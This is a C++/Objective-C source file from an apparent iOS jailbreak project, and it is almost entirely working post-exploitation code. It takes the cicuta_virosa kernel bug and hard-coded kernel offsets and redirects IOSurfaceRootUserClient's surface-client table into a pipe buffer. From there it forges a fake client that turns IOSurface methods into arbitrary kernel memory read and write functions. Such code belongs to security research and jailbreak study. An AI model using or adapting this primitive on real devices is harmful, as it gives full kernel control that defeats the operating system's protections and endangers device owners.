//
//  KernRW.cpp
//  JailbreakExploration
//
//  Created by Beckett O'Brien on 12/21/21.
//

#include "KernRW.h"
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurface.h>
#import "Exploit/cicuta_virosa.h"

// Mask PAC
#define UNPAC(addr) ((addr >> 39) == 0x1ffffff) ? addr : (addr | 0xffffff8000000000)

// Offsets
#define IPC_SPACE 0x330
#define IS_TABLE_SIZE 0x14
#define IS_TABLE 0x20
#define IP_KOBJECT 0x68

#define P_FD 0xf8
#define FD_OFILES 0x00
#define FP_GLOB 0x10
#define FG_DATA 0x38

#define SURFACE_CLIENTS 0x118

// Sizes
#define IPC_ENTRY_SIZE 0x18

void kernrw_log(const char* format, ...) {
    char *msg = NULL;
    va_list ap;
    va_start(ap, format);
    vasprintf(&msg, format, ap);
    [[NSNotificationCenter defaultCenter] postNotificationName:@"kernrw_log" object:[NSString stringWithUTF8String:msg]];
    va_end(ap);
    free(msg);
}

uint64_t task;

uint64_t ipc_entry_lookup(mach_port_t port_name) {
    uint64_t itk_space = UNPAC(read_64(task + IPC_SPACE));
    uint32_t table_size = read_32(itk_space + IS_TABLE_SIZE);
    uint32_t port_index = MACH_PORT_INDEX(port_name);
    if (port_index >= table_size) {
        kernrw_log("[-] Invalid port name %#x", port_name);
        return 0;
    }
    uint64_t is_table = UNPAC(read_64(itk_space + IS_TABLE));
    uint64_t entry = is_table + port_index * IPC_ENTRY_SIZE;
    return entry;
}

uint64_t port_name_to_ipc_port(mach_port_t port_name) {
    uint64_t entry = ipc_entry_lookup(port_name);
    uint64_t ipc_port = UNPAC(read_64(entry));
    return ipc_port;
}

uint64_t port_name_to_kobject(mach_port_t port_name) {
    uint64_t ipc_port = port_name_to_ipc_port(port_name);
    uint64_t kobject = UNPAC(read_64(ipc_port + IP_KOBJECT));
    return kobject;
}

struct _IOSurfaceFastCreateArgs {
    uint64_t address;
    uint32_t width;
    uint32_t height;
    uint32_t pixel_format;
    uint32_t bytes_per_element;
    uint32_t bytes_per_row;
    uint32_t alloc_size;
};

struct IOSurfaceLockResult {
    uint8_t *mem;
    uint8_t *shared_B0;
    uint8_t *shared_40;
    uint32_t surface_id;
    uint8_t _pad2[0xf60-0x18-0x4];
};

mach_port_t IOSurfaceRoot;
mach_port_t IOSurfaceRootUserClient;
uint32_t IOSurface_id;
mach_port_t IOSurface_worker_uc;
uint32_t IOSurface_worker_id;
uint64_t IOSurfaceRoot_uc;
uint64_t original_surfaceclients;

bool IOSurface_init(void) {
    IOSurfaceRoot = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (IOSurfaceRoot == MACH_PORT_NULL) {
        kernrw_log("[!] Couldn't open IOSurfaceRoot");
        return false;
    }
    if (IOServiceOpen(IOSurfaceRoot, mach_task_self(), 0, &IOSurfaceRootUserClient) != KERN_SUCCESS) {
        kernrw_log("[!] Couldn't open IOSurfaceRootUserClient");
        return false;
    }
    if (IOServiceOpen(IOSurfaceRoot, mach_task_self(), 0, &IOSurface_worker_uc) != KERN_SUCCESS) {
        kernrw_log("[!] Couldn't open IOSurfaceRoot worker UserClient");
        return false;
    }
    struct _IOSurfaceFastCreateArgs create_args = { .alloc_size = (uint32_t)getpagesize() };
    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = sizeof(lock_result);
    if (IOConnectCallMethod(IOSurfaceRootUserClient,
                            6, // create_surface_client_fast_path
                            NULL, 0, // input
                            &create_args, sizeof(create_args), // input struct
                            NULL, NULL, // output
                            &lock_result, &lock_result_size // output struct
                            ) != KERN_SUCCESS) {
        kernrw_log("[!] Couldn't create IOSurfaceClient");
    }
    IOSurface_id = lock_result.surface_id;
    if (IOConnectCallMethod(IOSurface_worker_uc, 6, NULL, 0, &create_args, sizeof(create_args), NULL, NULL, &lock_result, &lock_result_size) != KERN_SUCCESS) {
        kernrw_log("[!] Couldn't create IOSurfaceClient worker");
        return false;
    }
    IOSurface_worker_id = lock_result.surface_id;
    IOSurfaceRoot_uc = port_name_to_kobject(IOSurfaceRootUserClient);
    return true;
}

void IOSurface_deinit(void) {
    IOSurface_id = 0;
    IOServiceClose(IOSurfaceRootUserClient);
    IOObjectRelease(IOSurfaceRoot);
}

int pipefds[2] = { -1, -1 };
uint8_t *pipe_buffer;
const size_t pipe_buffer_size = 0x1000;
uint64_t pipe_base;

bool write_pipe(void) {
    size_t write_size = pipe_buffer_size - 1;
    ssize_t bytes_written = write(pipefds[1], pipe_buffer, write_size);
    if (bytes_written == write_size) {
        return true;
    }
    if (bytes_written < 0) {
        kernrw_log("[!] Couldn't write to pipe");
    } else if (bytes_written == 0) {
        kernrw_log("[!] Pipe is full");
    } else {
        kernrw_log("[!] Couldn't write full buffer to pipe. %zu of %zu bytes written", bytes_written, write_size);
    }
    return false;
}

bool read_pipe(void) {
    size_t read_size = pipe_buffer_size - 1;
    ssize_t bytes_read = read(pipefds[0], pipe_buffer, read_size);
    if (bytes_read == read_size) {
        return true;
    }
    if (bytes_read < 0) {
        perror("read_pipe");
        kernrw_log("[!] Couldn't read pipe");
    } else if (bytes_read == 0) {
        kernrw_log("[!] Pipe is empty");
    } else {
        kernrw_log("[!] Couldn't read full pipe buffer. %zu of %zu bytes read", bytes_read, read_size);
    }
    return false;
}

struct fake_client {
    uint64_t pad_00;
    uint64_t uc_obj;
    uint8_t pad_10[0x40];
    uint64_t surf_obj;
    uint8_t pad_58[0x360 - 0x58];
    uint64_t shared_rw;
};

bool KernRW_init(uint64_t proc) {
    task = UNPAC(read_64(proc + 0x10)); // Get task from proc
    kernrw_log("[*] Initializing IOSurface...");
    if (!IOSurface_init()) {
        kernrw_log("[!] Couldn't initialize IOSurface");
        return false;
    }
    kernrw_log("[*] Creating pipe...");
    // Create the pipe
    if ((pipe(pipefds) != 0) || (pipefds[0] < 0) || (pipefds[1] < 0)) {
        kernrw_log("[!] Couldn't create pipe");
        return false;
    }
    kernrw_log("[*] Filling pipe...");
    pipe_buffer = (uint8_t*)malloc(pipe_buffer_size);
    // We have to write to the pipe at least once for some reason
    write_pipe();
    read_pipe();
    // Find the pipe base
    kernrw_log("[*] finding p_fd");
    uint64_t p_fd = UNPAC(read_64(proc + P_FD));
    kernrw_log("[*] finding fd_ofiles");
    uint64_t fd_ofiles = UNPAC(read_64(p_fd + FD_OFILES));
    kernrw_log("[*] finding rpipe_fp");
    uint64_t rpipe_fp = UNPAC(read_64(fd_ofiles + (sizeof(uint64_t) * pipefds[0])));
    kernrw_log("[*] finding fp_glob");
    uint64_t fp_glob = UNPAC(read_64(rpipe_fp + FP_GLOB));
    kernrw_log("[*] finding rpipe");
    uint64_t rpipe = UNPAC(read_64(fp_glob + FG_DATA));
    kernrw_log("[*] finding pipe base");
    pipe_base = UNPAC(read_64(rpipe + 0x10));
    // Move IOSurfaceRootUserClient to point to the kernel's pipe buffer
    kernrw_log("[*] Moving surface clients to pipe buffer...");
    uint8_t bytes[20];
    read_20(IOSurfaceRoot_uc + SURFACE_CLIENTS - 4, bytes);
    original_surfaceclients = *(uint64_t*)(bytes + 4);
    *(uint64_t*)(bytes + 4) = pipe_base;
    write_20(IOSurfaceRoot_uc + SURFACE_CLIENTS - 4, bytes);
    return true;
}

uint32_t kread32(uint64_t addr) {
    struct fake_client *p = (struct fake_client *)pipe_buffer;
    p->uc_obj = pipe_base + 16;
    p->surf_obj = addr - 0xb4;
    write_pipe();
    // Call IOSurface method
    uint64_t i_scalar[1] = { 1 };
    uint64_t o_scalar[1];
    uint32_t i_count = 1;
    uint32_t o_count = 1;
    if (IOConnectCallMethod(IOSurfaceRootUserClient,
                            8, // s_get_ycbcrmatrix
                            i_scalar, i_count,
                            NULL, 0,
                            o_scalar, &o_count,
                            NULL, NULL
                            ) != KERN_SUCCESS) {
        kernrw_log("[!] s_get_ycbcrmatrix failed");
        return 0;
    }
    read_pipe();
    return (uint32_t)o_scalar[0];
}

uint64_t kread64(uint64_t addr) {
    return kread32(addr) | ((uint64_t)kread32(addr + 4) << 32);
}

uint64_t kreadptr(uint64_t addr) {
    uint64_t val = kread64(addr);
    if ((val >> 39) != 0x1ffffff) {
        val = UNPAC(val);
    }
    return val;
}

void kread(uint64_t addr, void *data, size_t count) {
    uint8_t *out = (uint8_t*)data;
    uint32_t val;
    size_t pos = 0;
    while (pos < count) {
        val = kread32(addr + pos);
        memcpy(out + pos, &val, (count - pos) >= 4 ? 4 : (count - pos));
        pos += 4;
    }
}

void kwrite64(uint64_t addr, uint64_t val) {
    struct fake_client *p = (struct fake_client *)pipe_buffer;
    p->uc_obj = pipe_base + 0x10;
    p->surf_obj = pipe_base;
    p->shared_rw = addr;
    write_pipe();
    // Call IOSurface method
    uint64_t i_scalar[3] = {
        1, 0, // fixed
        val
    };
    if (IOConnectCallMethod(IOSurfaceRootUserClient,
                            33, // s_set_indexed_timestamp
                            i_scalar, 3,
                            NULL, 0,
                            NULL, NULL,
                            NULL, NULL
                            ) != KERN_SUCCESS) {
        kernrw_log("[!] s_set_indexed_timestamp failed");
    }
    read_pipe();
}

void kwrite32(uint64_t addr, uint32_t val) {
    uint64_t old = kread64(addr);
    old &= 0xffffffff00000000;
    old |= val;
    kwrite64(addr, old);
}

void kwrite(uint64_t addr, void *data, size_t count) {
    uint64_t val;
    size_t pos = 0;
    while (pos < count) {
        size_t bytes = 8;
        if (bytes > (count - pos)) {
            bytes = count - pos;
            val = kread64(addr + pos);
        }
        memcpy(&val, (uint8_t *)data + pos, bytes);
        kwrite64(addr + pos, val);
        pos += 8;
    }
}
